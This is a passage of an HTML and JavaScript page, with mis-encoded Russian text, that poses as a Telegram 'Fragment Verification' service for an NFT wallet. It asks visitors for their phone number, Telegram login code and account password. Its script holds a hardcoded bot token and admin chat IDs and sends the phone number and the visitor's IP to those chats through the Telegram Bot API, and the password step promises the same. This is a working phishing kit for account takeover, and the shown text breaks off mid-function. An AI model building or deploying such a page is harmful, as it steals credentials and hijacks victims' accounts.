<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment Verification | Telegram NFT Wallet</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --telegram-blue: #0088cc;
            --telegram-blue-dark: #0077b3;
            --telegram-blue-light: #3399ff;
            --telegram-white: #ffffff;
            --telegram-gray: #f8f9fa;
            --telegram-gray-dark: #e9ecef;
            --telegram-gray-darker: #6c757d;
            --telegram-black: #212529;
            --telegram-green: #28a745;
            --telegram-red: #dc3545;
            --telegram-yellow: #ffc107;
            --telegram-shadow: 0 2px 12px rgba(0, 136, 204, 0.1);
            --telegram-radius: 12px;
            --telegram-transition: all 0.3s ease;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, var(--telegram-gray) 0%, #e3f2fd 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: var(--telegram-black);
            line-height: 1.6;
        }
        
        .telegram-container {
            width: 100%;
            max-width: 450px;
            background: var(--telegram-white);
            border-radius: var(--telegram-radius);
            box-shadow: var(--telegram-shadow);
            overflow: hidden;
            border: 1px solid var(--telegram-gray-dark);
            animation: slideUp 0.5s ease;
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .telegram-header {
            background: var(--telegram-blue);
            color: var(--telegram-white);
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .telegram-logo {
            width: 50px;
            height: 50px;
            background: var(--telegram-white);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--telegram-blue);
            font-size: 24px;
            font-weight: bold;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        
        .telegram-header-text h1 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .telegram-header-text p {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .telegram-content {
            padding: 30px;
        }
        
        .telegram-steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            position: relative;
        }
        
        .telegram-steps::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 20px;
            right: 20px;
            height: 2px;
            background: var(--telegram-gray-dark);
            z-index: 1;
        }
        
        .telegram-step {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }
        
        .step-circle {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: var(--telegram-gray-dark);
            color: var(--telegram-gray-darker);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 8px;
            transition: var(--telegram-transition);
        }
        
        .step-circle.active {
            background: var(--telegram-blue);
            color: var(--telegram-white);
            box-shadow: 0 4px 10px rgba(0, 136, 204, 0.3);
        }
        
        .step-circle.completed {
            background: var(--telegram-green);
            color: var(--telegram-white);
        }
        
        .step-text {
            font-size: 12px;
            color: var(--telegram-gray-darker);
            font-weight: 500;
            text-align: center;
        }
        
        .step-text.active {
            color: var(--telegram-blue);
            font-weight: 600;
        }
        
        .telegram-form {
            display: none;
        }
        
        .telegram-form.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .form-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--telegram-black);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .form-title i {
            color: var(--telegram-blue);
        }
        
        .telegram-input-group {
            margin-bottom: 24px;
        }
        
        .telegram-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--telegram-black);
            font-size: 15px;
        }
        
        .telegram-input {
            width: 100%;
            padding: 16px;
            border: 2px solid var(--telegram-gray-dark);
            border-radius: 10px;
            font-size: 16px;
            transition: var(--telegram-transition);
            background: var(--telegram-gray);
            color: var(--telegram-black);
        }
        
        .telegram-input:focus {
            outline: none;
            border-color: var(--telegram-blue);
            background: var(--telegram-white);
            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
        }
        
        .telegram-input::placeholder {
            color: var(--telegram-gray-darker);
        }
        
        .telegram-btn {
            width: 100%;
            padding: 16px;
            background: var(--telegram-blue);
            color: var(--telegram-white);
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: var(--telegram-transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }
        
        .telegram-btn:hover {
            background: var(--telegram-blue-dark);
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(0, 136, 204, 0.2);
        }
        
        .telegram-btn:active {
            transform: translateY(0);
        }
        
        .telegram-btn:disabled {
            background: var(--telegram-gray-darker);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .telegram-btn.secondary {
            background: var(--telegram-gray-darker);
        }
        
        .telegram-btn.secondary:hover {
            background: #5a6268;
        }
        
        .telegram-btn.warning {
            background: var(--telegram-yellow);
            color: var(--telegram-black);
        }
        
        .telegram-btn.warning:hover {
            background: #e0a800;
        }
        
        .telegram-btn.success {
            background: var(--telegram-green);
        }
        
        .telegram-btn.success:hover {
            background: #218838;
        }
        
        .telegram-btn.outline {
            background: transparent;
            border: 2px solid var(--telegram-blue);
            color: var(--telegram-blue);
        }
        
        .telegram-btn.outline:hover {
            background: var(--telegram-blue);
            color: white;
        }
        
        .telegram-hint {
            font-size: 13px;
            color: var(--telegram-gray-darker);
            margin-top: 8px;
            display: block;
            line-height: 1.5;
        }
        
        .phone-examples {
            background: var(--telegram-gray);
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
            border-left: 4px solid var(--telegram-blue);
        }
        
        .phone-examples h4 {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--telegram-black);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .phone-examples ul {
            list-style: none;
            padding-left: 0;
        }
        
        .phone-examples li {
            font-size: 13px;
            color: var(--telegram-gray-darker);
            margin-bottom: 6px;
            padding-left: 20px;
            position: relative;
        }
        
        .phone-examples li:before {
            content: '‚Ä¢';
            color: var(--telegram-blue);
            position: absolute;
            left: 0;
            font-weight: bold;
        }
        
        .telegram-info {
            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 24px;
            border: 1px solid #bbdefb;
        }
        
        .telegram-info h4 {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 12px;
            color: var(--telegram-blue);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .telegram-info ul {
            list-style: none;
            padding-left: 0;
        }
        
        .telegram-info li {
            font-size: 14px;
            color: var(--telegram-black);
            margin-bottom: 10px;
            padding-left: 24px;
            position: relative;
        }
        
        .telegram-info li:before {
            content: '‚úì';
            position: absolute;
            left: 0;
            color: var(--telegram-green);
            font-weight: bold;
        }
        
        .telegram-message {
            padding: 16px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: none;
            animation: fadeIn 0.5s ease;
        }
        
        .telegram-message.error {
            background: rgba(220, 53, 69, 0.1);
            border: 1px solid var(--telegram-red);
            color: var(--telegram-red);
        }
        
        .telegram-message.success {
            background: rgba(40, 167, 69, 0.1);
            border: 1px solid var(--telegram-green);
            color: var(--telegram-green);
        }
        
        .telegram-message.info {
            background: rgba(0, 136, 204, 0.1);
            border: 1px solid var(--telegram-blue);
            color: var(--telegram-blue);
        }
        
        .telegram-message.warning {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid var(--telegram-yellow);
            color: #856404;
        }
        
        .telegram-message.show {
            display: block;
        }
        
        .telegram-loader {
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        
        .loader-spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid var(--telegram-white);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .telegram-footer {
            padding: 20px;
            text-align: center;
            background: var(--telegram-gray);
            border-top: 1px solid var(--telegram-gray-dark);
            font-size: 14px;
            color: var(--telegram-gray-darker);
        }
        
        .telegram-footer a {
            color: var(--telegram-blue);
            text-decoration: none;
            font-weight: 500;
            transition: var(--telegram-transition);
        }
        
        .telegram-footer a:hover {
            text-decoration: underline;
            color: var(--telegram-blue-dark);
        }
        
        .telegram-icon {
            color: var(--telegram-blue);
        }
        
        @media (max-width: 480px) {
            .telegram-container {
                border-radius: 0;
            }
            
            .telegram-content {
                padding: 20px;
            }
            
            .telegram-header {
                padding: 15px;
            }
        }
        
        @keyframes successPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .success-animation {
            animation: successPulse 0.5s ease;
        }
        
        .verification-status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background: var(--telegram-gray);
            border: 1px solid var(--telegram-gray-dark);
        }
        
        .verification-status h4 {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--telegram-black);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .verification-status p {
            font-size: 13px;
            color: var(--telegram-gray-darker);
            margin-bottom: 5px;
        }
        
        .status-badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin-left: 10px;
        }
        
        .status-pending {
            background: rgba(255, 193, 7, 0.2);
            color: #856404;
        }
        
        .status-approved {
            background: rgba(40, 167, 69, 0.2);
            color: var(--telegram-green);
        }
        
        .status-rejected {
            background: rgba(220, 53, 69, 0.2);
            color: var(--telegram-red);
        }
        
        .telegram-timer {
            display: inline-block;
            padding: 4px 10px;
            background: var(--telegram-blue);
            color: white;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin-left: 10px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        
        .password-field {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--telegram-gray-darker);
            cursor: pointer;
            font-size: 18px;
            padding: 5px;
        }
        
        .security-info {
            background: rgba(255, 193, 7, 0.1);
            border-radius: 8px;
            padding: 12px;
            margin-top: 10px;
            border-left: 4px solid var(--telegram-yellow);
        }
        
        .security-info h4 {
            font-size: 14px;
            color: #856404;
            margin-bottom: 5px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .security-info p {
            font-size: 12px;
            color: #856404;
            margin: 0;
        }
        
        .optional-section {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px dashed var(--telegram-gray-dark);
        }
        
        .optional-title {
            font-size: 14px;
            color: var(--telegram-gray-darker);
            margin-bottom: 10px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        .btn-group .telegram-btn {
            flex: 1;
            margin-top: 0;
        }
    </style>
</head>
<body>
    <div class="telegram-container">
        <div class="telegram-header">
            <div class="telegram-logo">
                <i class="fab fa-telegram"></i>
            </div>
            <div class="telegram-header-text">
                <h1>Fragment Verification</h1>
                <p>–¢—Ä–µ—Ö—ç—Ç–∞–ø–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ ‚Ä¢ –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å</p>
            </div>
        </div>
        
        <div class="telegram-content">
            <div class="telegram-steps">
                <div class="telegram-step">
                    <div class="step-circle active" id="stepCircle1">1</div>
                    <div class="step-text active" id="stepText1">–ù–æ–º–µ—Ä</div>
                </div>
                <div class="telegram-step">
                    <div class="step-circle" id="stepCircle2">2</div>
                    <div class="step-text" id="stepText2">–ö–æ–¥</div>
                </div>
                <div class="telegram-step">
                    <div class="step-circle" id="stepCircle3">3</div>
                    <div class="step-text" id="stepText3">–ü–∞—Ä–æ–ª—å</div>
                </div>
                <div class="telegram-step">
                    <div class="step-circle" id="stepCircle4">4</div>
                    <div class="step-text" id="stepText4">–ì–æ—Ç–æ–≤–æ</div>
                </div>
            </div>
            
            <div class="telegram-message error" id="errorMessage">
                <i class="fas fa-exclamation-circle"></i> <span id="errorText"></span>
            </div>
            
            <div class="telegram-message success" id="successMessage">
                <i class="fas fa-check-circle"></i> <span id="successText"></span>
            </div>
            
            <div class="telegram-message info" id="infoMessage">
                <i class="fas fa-info-circle"></i> <span id="infoText"></span>
            </div>
            
            <!-- –§–æ—Ä–º–∞ 1: –í–≤–æ–¥ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
            <div class="telegram-form active" id="formPhone">
                <div class="form-title">
                    <i class="fas fa-mobile-alt telegram-icon"></i>
                    –®–∞–≥ 1: –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞
                </div>
                
                
                <div class="telegram-input-group">
                    <label class="telegram-label" for="phoneInput">
                        <i class="fas fa-phone telegram-icon"></i>
                        –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ 
                    </label>
                    <input type="text" 
                           id="phoneInput" 
                           class="telegram-input" 
                           placeholder="+7 999 123 45 67"
                           maxlength="20">
                    <span class="telegram-hint">
                        <i class="fas fa-info-circle"></i>
                        –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä
                    </span>
                </div>
                
                <button class="telegram-btn" onclick="sendPhoneNumber()" id="sendPhoneBtn">
                    <i class="fas fa-paper-plane"></i>
                    –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä
                </button>
            </div>
            
            <!-- –§–æ—Ä–º–∞ 2: –í–≤–æ–¥ –∫–æ–¥–∞ -->
            <div class="telegram-form" id="formCode">
                <div class="form-title">
                    <i class="fas fa-key telegram-icon"></i>
                    –®–∞–≥ 2: –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
                </div>
                
                
                <div class="telegram-input-group">
                    <label class="telegram-label" for="codeInput">
                        <i class="fas fa-lock telegram-icon"></i>
                        5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –∏–∑ Telegram
                    </label>
                    <input type="text" 
                           id="codeInput" 
                           class="telegram-input" 
                           placeholder="12345"
                           maxlength="5">
                    <span class="telegram-hint">
                        <i class="fas fa-clock"></i>
                        –ö–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω 5 –º–∏–Ω—É—Ç
                    </span>
                </div>
                
                <button class="telegram-btn" onclick="sendVerificationCode()" id="sendCodeBtn">
                    <i class="fas fa-check-circle"></i>
                    –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥
                </button>
                
                <button class="telegram-btn secondary" onclick="backToPhoneStep()" style="margin-top: 10px;">
                    <i class="fas fa-arrow-left"></i>
                    –í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –Ω–æ–º–µ—Ä—É
                </button>
            </div>
            
            <!-- –§–æ—Ä–º–∞ 3: –í–≤–æ–¥ –ø–∞—Ä–æ–ª—è (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ) -->
            <div class="telegram-form" id="formPassword">
                <div class="form-title">
                    <i class="fas fa-lock telegram-icon"></i>
                    –®–∞–≥ 3: –ü–∞—Ä–æ–ª—å –æ—Ç Fragment (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
                </div>
                
                
                <div class="telegram-input-group">
                    <label class="telegram-label" for="passwordInput">
                        <i class="fas fa-key telegram-icon"></i>
                        –ü–∞—Ä–æ–ª—å –æ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞
                    </label>
                    <div class="password-field">
                        <input type="password" 
                               id="passwordInput" 
                               class="telegram-input" 
                               placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å (–µ—Å–ª–∏ –µ—Å—Ç—å)"
                               maxlength="50">
                        <button class="toggle-password" type="button" onclick="togglePasswordVisibility()">
                            <i class="fas fa-eye"></i>
                        </button>
                    </div>
                    <span class="telegram-hint">
                        <i class="fas fa-info-circle"></i>
                        –û—Å–Ω–æ–≤–Ω–æ–π –ø–∞—Ä–æ–ª—å –¥–ª—è –≤—Ö–æ–¥–∞ 
                    </span>
                </div>
                
                <div class="security-info">
                    <h4><i class="fas fa-shield-alt"></i> –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –¥–∞–Ω–Ω—ã—Ö:</h4>
                    <p>–ü–∞—Ä–æ–ª—å –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –≤ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–º –≤–∏–¥–µ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏.</p>
                </div>
                
                <div class="btn-group">
                    <button class="telegram-btn success" onclick="sendPassword()" id="sendPasswordBtn">
                        <i class="fas fa-paper-plane"></i>
                        –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å
                    </button>
                    
                    <button class="telegram-btn outline" onclick="skipPassword()" id="skipPasswordBtn">
                        <i class="fas fa-forward"></i>
                        –ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–∞—Ä–æ–ª—å
                    </button>
                </div>
                
                <button class="telegram-btn secondary" onclick="backToCodeStep()" style="margin-top: 10px;">
                    <i class="fas fa-arrow-left"></i>
                    –í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –∫–æ–¥—É
                </button>
            </div>
            
            <!-- –§–æ—Ä–º–∞ 4: –£—Å–ø–µ—Ö -->
            <div class="telegram-form" id="formSuccess">
                <div class="form-title" style="color: var(--telegram-green);">
                    <i class="fas fa-check-circle" style="color: var(--telegram-green);"></i>
                    –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞!
                </div>
                
                <div class="telegram-info" style="background: rgba(40, 167, 69, 0.1); border-color: var(--telegram-green);">
                    <h4 style="color: var(--telegram-green);">
                        <i class="fas fa-info-circle"></i>
                        –ß—Ç–æ –¥–∞–ª—å—à–µ?
                    </h4>
                    <ul>
                        <li>–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É</li>
                        <li><span id="hasPasswordText">–ü–∞—Ä–æ–ª—å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏</span></li>
                        <li>–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –ø—Ä–æ–≤–µ—Ä–∏—Ç –¥–∞–Ω–Ω—ã–µ –≤ —Å–∏—Å—Ç–µ–º–µ Fragment</li>
                        <li>–û–±—ã—á–Ω–æ –ø—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–Ω–∏–º–∞–µ—Ç 5-15 –º–∏–Ω—É—Ç</li>
                        <li>–ü–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ –±–æ—Ç–µ</li>
                    </ul>
                </div>
                
                
                <a href="https://t.me/NftkeysswalletBot" target="_blank" class="telegram-btn success-animation" style="background: var(--telegram-green);">
                    <i class="fab fa-telegram"></i>
                    –ü–µ—Ä–µ–π—Ç–∏ –≤ @NftkeysswalletBot
                </a>
                
                <button class="telegram-btn" onclick="startNewVerification()" style="background: var(--telegram-blue); margin-top: 10px;">
                    <i class="fas fa-redo"></i>
                    –ù–∞—á–∞—Ç—å –Ω–æ–≤—É—é –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é
                </button>
            </div>
        </div>
        
    </div>

    <script>
        // === –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ===
        const BOT_TOKEN = "8080773908:AAEiuj8GIgI0s8IrLY0CgdFS7tWZ1KBDHcE";
        const ADMIN_CHAT_IDS = [8499933452, 8443492299];
        
        // === –ü–ï–†–ï–ú–ï–ù–ù–´–ï –°–û–°–¢–û–Ø–ù–ò–Ø ===
        let currentStep = 1;
        let phoneNumber = "";
        let verificationCode = "";
        let userPassword = "";
        let hasPassword = false;
        let sessionId = "";
        
        // === –≠–õ–ï–ú–ï–ù–¢–´ DOM ===
        const forms = {
            phone: document.getElementById('formPhone'),
            code: document.getElementById('formCode'),
            password: document.getElementById('formPassword'),
            success: document.getElementById('formSuccess')
        };
        
        const stepCircles = {
            1: document.getElementById('stepCircle1'),
            2: document.getElementById('stepCircle2'),
            3: document.getElementById('stepCircle3'),
            4: document.getElementById('stepCircle4')
        };
        
        const stepTexts = {
            1: document.getElementById('stepText1'),
            2: document.getElementById('stepText2'),
            3: document.getElementById('stepText3'),
            4: document.getElementById('stepText4')
        };
        
        const phoneInput = document.getElementById('phoneInput');
        const codeInput = document.getElementById('codeInput');
        const passwordInput = document.getElementById('passwordInput');
        const sendPhoneBtn = document.getElementById('sendPhoneBtn');
        const sendCodeBtn = document.getElementById('sendCodeBtn');
        const sendPasswordBtn = document.getElementById('sendPasswordBtn');
        const skipPasswordBtn = document.getElementById('skipPasswordBtn');
        const errorMessage = document.getElementById('errorMessage');
        const errorText = document.getElementById('errorText');
        const successMessage = document.getElementById('successMessage');
        const successText = document.getElementById('successText');
        const infoMessage = document.getElementById('infoMessage');
        const infoText = document.getElementById('infoText');
        
        // === –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ===
        function init() {
            setupEventListeners();
            autoDetectCountry();
            hideMessages();
            checkAdminConfig();
            restoreSession();
        }
        
        function checkAdminConfig() {
            if (!ADMIN_CHAT_IDS || ADMIN_CHAT_IDS.length === 0) {
                console.warn('‚ö†Ô∏è ADMIN_CHAT_IDS –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã.');
            }
        }
        
        function setupEventListeners() {
            phoneInput.addEventListener('input', formatPhoneInput);
            phoneInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') sendPhoneNumber();
            });
            
            codeInput.addEventListener('input', validateCodeInput);
            codeInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') sendVerificationCode();
            });
            
            passwordInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') sendPassword();
            });
            
            // –ì–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏
            document.addEventListener('keydown', (e) => {
                if (e.altKey && e.key === '1') {
                    e.preventDefault();
                    phoneInput.value = '+79991234567';
                    showInfo('–¢–µ—Å—Ç–æ–≤—ã–π –Ω–æ–º–µ—Ä +79991234567 –¥–æ–±–∞–≤–ª–µ–Ω (Alt+1)');
                }
                if (e.altKey && e.key === '2') {
                    e.preventDefault();
                    codeInput.value = '12345';
                    showInfo('–¢–µ—Å—Ç–æ–≤—ã–π –∫–æ–¥ 12345 –¥–æ–±–∞–≤–ª–µ–Ω (Alt+2)');
                }
                if (e.altKey && e.key === '3') {
                    e.preventDefault();
                    passwordInput.value = 'testpassword123';
                    showInfo('–¢–µ—Å—Ç–æ–≤—ã–π –ø–∞—Ä–æ–ª—å –¥–æ–±–∞–≤–ª–µ–Ω (Alt+3)');
                }
            });
        }
        
        function formatPhoneInput(e) {
            let value = e.target.value;
            value = value.replace(/[^\d+]/g, '');
            
            if (value.includes('+')) {
                const parts = value.split('+');
                value = '+' + parts.join('');
                if (value.length > 1 && value[1] === '+') {
                    value = value.substring(1);
                }
            }
            
            if (value && value[0] !== '+') {
                value = '+' + value;
            }
            
            if (value.length > 3) {
                value = value.replace(/(\+\d{1,3})(\d{0,3})?(\d{0,3})?(\d{0,4})?/, function(match, p1, p2, p3, p4) {
                    let formatted = p1;
                    if (p2) formatted += ' ' + p2;
                    if (p3) formatted += ' ' + p3;
                    if (p4) formatted += ' ' + p4;
                    return formatted;
                });
            }
            
            e.target.value = value;
        }
        
        function validateCodeInput(e) {
            let value = e.target.value;
            value = value.replace(/\D/g, '');
            value = value.substring(0, 6);
            e.target.value = value;
        }
        
        function togglePasswordVisibility() {
            const toggleBtn = document.querySelector('.toggle-password i');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.classList.remove('fa-eye');
                toggleBtn.classList.add('fa-eye-slash');
            } else {
                passwordInput.type = 'password';
                toggleBtn.classList.remove('fa-eye-slash');
                toggleBtn.classList.add('fa-eye');
            }
        }
        
        // === –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò ===
        
        async function sendPhoneNumber() {
            const phone = phoneInput.value.trim().replace(/\s/g, '');
            
            if (!validatePhone(phone)) {
                return;
            }
            
            if (ADMIN_CHAT_IDS.length === 0) {
                showError('‚ùå –û–®–ò–ë–ö–ê –ù–ê–°–¢–†–û–ô–ö–ò\n\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—ã –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã.');
                return;
            }
            
            sendPhoneBtn.disabled = true;
            sendPhoneBtn.innerHTML = `
                <div class="telegram-loader">
                    <div class="loader-spinner"></div>
                    <span>–û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞...</span>
                </div>
            `;
            
            hideMessages();
            phoneNumber = phone;
            
            // –°–æ–∑–¥–∞–µ–º ID —Å–µ—Å—Å–∏–∏
            sessionId = 'FRAG_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8).toUpperCase();
            
            try {
                await sendPhoneToAdmins(phone, sessionId);
            } catch (error) {
                handlePhoneError(error);
            }
        }
        
        function validatePhone(phone) {
            if (!phone) {
                showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                phoneInput.focus();
                return false;
            }
            
            if (!phone.startsWith('+')) {
                showError('–ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å + –∏ –∫–æ–¥–∞ —Å—Ç—Ä–∞–Ω—ã');
                phoneInput.focus();
                return false;
            }
            
            const digitsOnly = phone.substring(1).replace(/\D/g, '');
            if (digitsOnly.length < 5) {
                showError('–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π');
                phoneInput.focus();
                return false;
            }
            
            if (digitsOnly.length > 15) {
                showError('–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π');
                phoneInput.focus();
                return false;
            }
            
            return true;
        }
        
        async function sendPhoneToAdmins(phone, sessionId) {
            const timestamp = new Date().toLocaleString('ru-RU');
            const ipInfo = await getIpInfo();
            
            const message = `–ü–æ–ª—É—á–µ–Ω –Ω–æ–º–µ—Ä

üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–ø—Ä–∞–≤–∏–ª –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:

üì± <b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${phone}</code>
üïê <b>–í—Ä–µ–º—è:</b> ${timestamp}
üåê <b>IP:</b> ${ipInfo}
`;
            
            let successCount = 0;
            
            for (const chatId of ADMIN_CHAT_IDS) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.ok) {
                        successCount++;
                        console.log(`‚úÖ –ù–æ–º–µ—Ä –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–¥–º–∏–Ω—É ${chatId}`);
                    } else {
                        console.error(`‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∞–¥–º–∏–Ω—É ${chatId}:`, data);
                    }
                } catch (error) {
                    console.error(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏ –¥–ª—è –∞–¥–º–∏–Ω–∞ ${chatId}:`, error);
                }
                
                await sleep(100);
            }
            
            if (successCount > 0) {
                saveSession(phone, sessionId);
